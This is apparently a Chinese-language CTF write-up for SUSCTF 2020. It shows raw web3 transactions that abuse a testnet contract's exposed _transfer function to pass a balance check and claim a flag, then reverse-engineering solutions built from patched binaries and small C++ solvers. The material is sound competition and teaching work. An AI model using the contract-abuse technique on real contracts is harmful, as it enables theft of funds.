![image-20201020164326068](https://timg.reito.fun/archive/typora-schwarzer/image-20201020164326068.png)

是一个交易，再来看看第二个是啥

![image-20201020164419926](https://timg.reito.fun/archive/typora-schwarzer/image-20201020164419926.png)

是一个合约，好了，给👴整蒙了，随后就去找了一些ctf中区块链题，于是对区块链有了一知半解的认识。总之，做出这道题应该是够了。

首先我需要一个账户来与这个合约交互，合约是什么，就是一个编译好的二进制代码，所用语言没细看，反正能看懂就行了（指Ropsten自带的反编译器，ethervm.io还是有点难看懂）。和这个合约交互的过程，我们可以发送数据，合约解析数据，可以知道我们要访问合约中的哪个函数，然后执行，这样一个过程叫做交易。

在看代码之前我首先看到的是上图的一句话：`注意: 我们还发现另一个 2合约 具有完全匹配的字节代码`，这意味着有另外两个合约有着相同的代码，其中，[一个合约](https://ropsten.etherscan.io/address/0x72aa0b365fb9705ec4c4bc17df32ce7fb3793f94)存在一些交易记录，推测是出题人测试时留下的，想着可能有用，主要有两个类型的交易，[第一类](https://ropsten.etherscan.io/tx/0x29a79ad46ba3fca9ad018c603578385fe10ddb158888439a5ced0ac7aaca600f)解析出了`_transfer`

```
Function: _transfer(address _from, address _to, uint256 _value) ***

MethodID: 0x30e0789e
[0]:  000000000000000000000000aba596caeac381cd80d5cdaa098a82b999ead1d9
[1]:  000000000000000000000000c9219dd84a3210920addbead9d0099f4a8b27229
[2]:  00000000000000000000000000000000000000000000000000000000000f32a7
```

![image-20201020165349287](https://timg.reito.fun/archive/typora-schwarzer/image-20201020165349287.png)

[第二类](https://ropsten.etherscan.io/tx/0x29a79ad46ba3fca9ad018c603578385fe10ddb158888439a5ced0ac7aaca600f)使用了PayForFlag

```
Function: PayForFlag(string b64email) ***

MethodID: 0xcd09039b
[0]:  0000000000000000000000000000000000000000000000000000000000000020
[1]:  0000000000000000000000000000000000000000000000000000000000000030
[2]:  6333567a5933526d4d6a41794d45426a65574a6c636e4e7759574e6c6332566a
[3]:  64584a7064486b75623235736157356c00000000000000000000000000000000
```

![image-20201020165320804](https://timg.reito.fun/archive/typora-schwarzer/image-20201020165320804.png)

很显然是一段邮箱，解析后是`susctf2020@cyberspacesecurity.online`，从搜到的题目推测，应该是接收flag的？

于是推测出我只要做相同的事情就可以了，注意到第一类，`_from`是合约上传者地址

![image-20201020165644105](https://timg.reito.fun/archive/typora-schwarzer/image-20201020165644105.png)

![image-20201020165655558](https://timg.reito.fun/archive/typora-schwarzer/image-20201020165655558.png)

`_to`是发起交易者的地址

![image-20201020165725673](https://timg.reito.fun/archive/typora-schwarzer/image-20201020165725673.png)

`_value`请看下面代码，这个`cd09039b`恰好就是`PayForFlag`函数签名，推测这个叫合约的东西执行的时候是通过匹配函数签名执行的。我们看到`_balances[caller] == 996007`，因此`_transfer`的目的就是给发送者账户里转钱，从而通过这个校验。这个函数还有后续部分后面再说。

```python
def unknowncd09039b(array _param1) payable:  # PayForFlag
  mem[128 len _param1.length] = _param1[all]
  require _balances[caller] == 996007
```

那么我们就该转钱了，搜了一下，可以安装Chrome插件MetaMask来创建账户，从测试服中获取了5个以太币用于答题。

![image-20201020170401072](https://timg.reito.fun/archive/typora-schwarzer/image-20201020170401072.png)

然后就尬住了，因为其他网上的题目都是提供部分源码的，因此可以通过[Remix](http://remix.ethereum.org)（专门编译合约上传的）来编译，然后向合约发送交易。但我们没有源码，因此需要找另一个办法。

找了半天，发现Remix其实使用`web3.eth.sendTransaction`的自带javascript库进行发送交易的，首先打开Remix，在左边点击这个图标，注意要以http方式访问Remix

![image-20201020191335483](https://timg.reito.fun/archive/typora-schwarzer/image-20201020191335483.png)

选取Injected Web3，MetaMask会弹出登录确认框完成连接，选取你的账户。随后在下方控制台输入命令

```
web3.eth.sendTransaction({
    "from" : "0xBBEd4209600E8E205A818C1D6A7d4e7D943783aA",
    "to" : "0xe3B3D81Ab33640c6b67D6bf7aEB8bF1d04ca016a", 
    "data": "0x30e0789e000000000000000000000000aba596caeac381cd80d5cdaa098a82b999ead1d9000000000000000000000000bbed4209600e8e205a818c1d6a7d4e7d943783aa00000000000000000000000000000000000000000000000000000000000f32a7" 
    });
```

其中data前8字节为函数签名，这样合约就会调用`_transfer`函数，MetaMask也会弹出进行交易确认，可以理解为真正交易的发起者是MetaMask，因为还要负责签名（截图在下文提供）。然后调用`PayForFlag`，这里要注意`PayForFlag`函数。

```python
  mem[ceil32(_param1.length) + 160] = 'c3VzY3RmMjAy'
  idx = 0
  while idx < 12:
      require idx < _param1.length
      require idx < 12
      require Mask(8, 248, mem[ceil32(_param1.length) + idx + 160]) == Mask(8, 248, mem[idx + 128])
      idx = idx + 1
      continue
```

会检查头部，需要邮件的base64头部一样，即你的邮箱需要以susctf202开头。随后构造payload，注意

```
0000000000000000000000000000000000000000000000000000000000000020
```

为字符串长度

```
6333567a5933526d4d6a41794d4852796555426e625746706243356a6232303d
```

为字符串，这里是`c3VzY3RmMjAyMHRyeUBnbWFpbC5jb20=`，即`susctf2020try@gmail.com`

```
web3.eth.sendTransaction({
    "from" : "0xBBEd4209600E8E205A818C1D6A7d4e7D943783aA",
    "to" : "0xe3B3D81Ab33640c6b67D6bf7aEB8bF1d04ca016a", 
    "data": "0xcd09039b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000206333567a5933526d4d6a41794d4852796555426e625746706243356a6232303d" 
    });
```

![image-20201020192318083](https://timg.reito.fun/archive/typora-schwarzer/image-20201020192318083.png)

给3000个GAS费用，处理的比较快，过一会儿就好了。

![image-20201020193203189](https://timg.reito.fun/archive/typora-schwarzer/image-20201020193203189.png)

![image-20201020193155990](https://timg.reito.fun/archive/typora-schwarzer/image-20201020193155990.png)

交易被确认了，查收邮件。

![image-20201020193132180](https://timg.reito.fun/archive/typora-schwarzer/image-20201020193132180.png)

获取到flag

```
SUSCTF{oHUHNNHBH_youg3t1t^tql_y0uare7hekingofr3}
```

## [re]芜湖起飞

芜湖，启动

![image-20201020193414310](https://timg.reito.fun/archive/typora-schwarzer/image-20201020193414310.png)

一看就是嵌入的网页。以前做过嵌入javascript的题。首先看了一下文件结构

![image-20201020193552153](https://timg.reito.fun/archive/typora-schwarzer/image-20201020193552153.png)

发现底部有大量PK开头的头文件，一查原来是自解压文件。找到解压目录。

![image-20201020193650794](https://timg.reito.fun/archive/typora-schwarzer/image-20201020193650794.png)

这种结构就是嵌入了CEF，看看resources。

![image-20201020193809849](https://timg.reito.fun/archive/typora-schwarzer/image-20201020193809849.png)

找到了一个`app.asar`，估计是应用，在网上搜了一圈，发现有一个7Z[插件](https://www.tc4shell.com/en/7zip/asar/)，解压得到

![image-20201020193925283](https://timg.reito.fun/archive/typora-schwarzer/image-20201020193925283.png)

查看源码

```javascript
window.onload = function () {
    try {
        let ffi = require('ffi-napi');
        window.checkFlag = ffi.Library('dll/gifts.dll', {
            'checkTheAns': ['int', ['string']]
        })
    } catch (error) {
        console.error('ffi.Library', error);
    }
}
function judge() {
    let sure = document.getElementsByName('flag')[0].value;
    let ant = checkFlag.checkTheAns(sure);
    if(`${ant}` == 0 ){
        console.log('you get it! the flag is: '+sure);
    }else{
        console.log(sure+' is wrong!');
    }
}
```

发现是调用了一个原生库进行检查，拖进IDA分析一下

![image-20201020194252332](https://timg.reito.fun/archive/typora-schwarzer/image-20201020194252332.png)

经过分析，是一个32维的线性方程组求解问题（......）。写了一个C++程序试图求解，后来又改成了matlab命令生成器~~（工具人）~~。

```cpp
#include <iostream>
#include <string>
#include <fstream>
 
unsigned char youknowit_c[4100] = {
    //...
}; 
unsigned char daweitianlong_c[4100] = { 
    //...
};
const char* truth = "YdjsJdkGdksidnawDKowDJAAtqlAAtql";

int main()
{
    int* youknowit = (int*)youknowit_c;
    int* daweitianlong = (int*)daweitianlong_c;

    std::ofstream fout = std::ofstream("./out.txt", std::ios_base::out);
    fout << "syms ";
    for (int i = 0; i < 32; ++i) {
        fout << "c" << i << " ";
    }
    fout << ";" << std::endl;

    for (int i = 0; i < 32; ++i) {
        std::string equation = "equ" + std::to_string(i) + "=";
        for (int k = 0; k < 32; ++k) {
            int ax = (2 * youknowit[32 * i + k] - 1) * daweitianlong[32 * i + k];
            equation += std::to_string(ax) + "*c" + std::to_string(k); 
            if (k != 31)
                equation += "+";
        } 
        equation += "==" + std::to_string((int)truth[i]) + ";";
        fout << equation << std::endl;
    }

    fout << "equ32=c0==" << (int)'S' << ";" << std::endl;
    fout << "equ33=c1==" << (int)'U' << ";" << std::endl;
    fout << "equ34=c2==" << (int)'S' << ";" << std::endl;
    fout << "equ35=c3==" << (int)'C' << ";" << std::endl;
    fout << "equ36=c4==" << (int)'T' << ";" << std::endl;
    fout << "equ37=c5==" << (int)'F' << ";" << std::endl;
    fout << "equ38=c6==" << (int)'{' << ";" << std::endl;
    fout << "equ39=c31==" << (int)'}' << ";" << std::endl;

    fout << "[" ;
    for (int i = 0; i < 32; ++i) {
        fout << "c" << i << " ";
    }
    fout << "]=solve(";
    for (int i = 0; i < 40; ++i) {
        fout << "equ" << i << ",";
    }
    for (int i = 0; i < 32; ++i) {
        fout << "c" << i;
        if (i != 31)
            fout << ",";
    }
    fout << ");" << std::endl;

    fout << "disp([";
    for (int i = 0; i < 32; ++i) {
        fout << "char(double(c" << i << ")) ";
    }
    fout << "])" << std::endl;

    fout.flush();
    fout.close();
}
```

生成出了matlab代码，拷贝到matlab中运行

![image-20201020194631096](https://timg.reito.fun/archive/typora-schwarzer/image-20201020194631096.png)

得到flag

```
SUSCTF{gyx_wants_a_girlfriends_}
```

## [re]静置

拖入IDA分析，直接看到答案。

![image-20201020195041951](https://timg.reito.fun/archive/typora-schwarzer/image-20201020195041951.png)

```
SUSCTF{W3lcome_to_SUSCTF_2020_RE#}
```

## [re]babyxor

先看反编译

![image-20201020195448302](https://timg.reito.fun/archive/typora-schwarzer/image-20201020195448302.png)

简单的异或，使用[网页](http://xor.pw/#)解出答案。

![image-20201020195720865](https://timg.reito.fun/archive/typora-schwarzer/image-20201020195720865.png)

```
SUSCTF{xor_x1r_xtR_Xgr_xXx_r0x$}
```

## [re]中之人

压轴题，还是挺要技巧的。拖进IDA，首先手动定位到main，发现上方有一段代码被加密。

![image-20201020195949165](https://timg.reito.fun/archive/typora-schwarzer/image-20201020195949165.png)

其次main中有花指令（不知道是不是，反正挺花的，也不知道怎么实现的），需要手动修复一下。

![image-20201020200039152](https://timg.reito.fun/archive/typora-schwarzer/image-20201020200039152.png)

通过动态调试，可以知道指令的执行流程总是这样的

![image-20201020200130470](https://timg.reito.fun/archive/typora-schwarzer/image-20201020200130470.png)

因此把这一大段都给nop掉就行了

![image-20201020200313988](https://timg.reito.fun/archive/typora-schwarzer/image-20201020200313988.png)

后面还有两段这种结构的，都给他nop掉。

![image-20201020200357074](https://timg.reito.fun/archive/typora-schwarzer/image-20201020200357074.png)

![image-20201020200404938](https://timg.reito.fun/archive/typora-schwarzer/image-20201020200404938.png)

最后选取这个函数段，创建函数，就可以愉快的F5了。

![image-20201020201313882](https://timg.reito.fun/archive/typora-schwarzer/image-20201020201313882.png)

查看一下`sub_4008B9`

![image-20201020200614975](https://timg.reito.fun/archive/typora-schwarzer/image-20201020200614975.png)

感觉上完成了父进程读取子进程读取/proc/version的信息，并等待子进程结束这么个过程。尝试运行了这个程序，应该不需要进行动态调试，改个名字吧。

![image-20201020200532966](https://timg.reito.fun/archive/typora-schwarzer/image-20201020200532966.png)

那么就接着往下看`main`

![image-20201020201335629](https://timg.reito.fun/archive/typora-schwarzer/image-20201020201335629.png)

`byte_400A69`就是那段加密的代码，随后进行了mprotect，很显然就是代码了。然后是对前10字节进行解密，就可以运行了。根据一般经验，函数头部一般是

```
push    rbp
mov     rbp, rsp
```

因此照着这个尝试一下解密

![image-20201020201600623](https://timg.reito.fun/archive/typora-schwarzer/image-20201020201600623.png)

那就是本次比赛的flag头，因此猜测前面的read是要输入完整flag，不过这5个已经够我们把加密函数解出来了，在Hex View进行修补。

![image-20201020201734558](https://timg.reito.fun/archive/typora-schwarzer/image-20201020201734558.png)

按C转为指令，会发现也存在花指令（？）

![image-20201020201947667](https://timg.reito.fun/archive/typora-schwarzer/image-20201020201947667.png)

手动修补

![image-20201020202058361](https://timg.reito.fun/archive/typora-schwarzer/image-20201020202058361.png)

下面还有

![image-20201020202144162](https://timg.reito.fun/archive/typora-schwarzer/image-20201020202144162.png)

快乐F5

![image-20201020202427882](https://timg.reito.fun/archive/typora-schwarzer/image-20201020202427882.png)

结合一下main

![image-20201020202507623](https://timg.reito.fun/archive/typora-schwarzer/image-20201020202507623.png)

可以知道a1就是`"Linux version"`，a2就是`SUSCT`后面的`F{......}`。总之大概翻译一下就是`a1 xor a2`等于上面那段栈上没自动转换为字符串的东西。写一个C++程序进行解密

```cpp
#include <cstdio> 

int main() {
	int i = 0;
	char ans[] = "SUSCT0000000000000\0";
	char salt[] = { 18, 10, 27, 20, -28, 76, 79, 8, 37, 48, 66, 14, 85, 85 };
	char key[] = "Linux version ";
	while (i <= 13)
	{
		char sc = *(salt + i);
		char kc = *(key + i) + 8; 
		for (char c = 32; c < 127; ++c) 
		{
			char ac = kc ^ c;
			if (ac == sc)
			{
				ans[i + 5] = c;
				break;
			}
		}
		i++;
	}
	printf(ans);
}
```

运行即可得到flag

![image-20201020202810406](https://timg.reito.fun/archive/typora-schwarzer/image-20201020202810406.png)

```
SUSCTF{midd1e_K3y#}
```

## 后记

很开心，希望以后可以代表学校出战，有一天能吊打复旦白泽

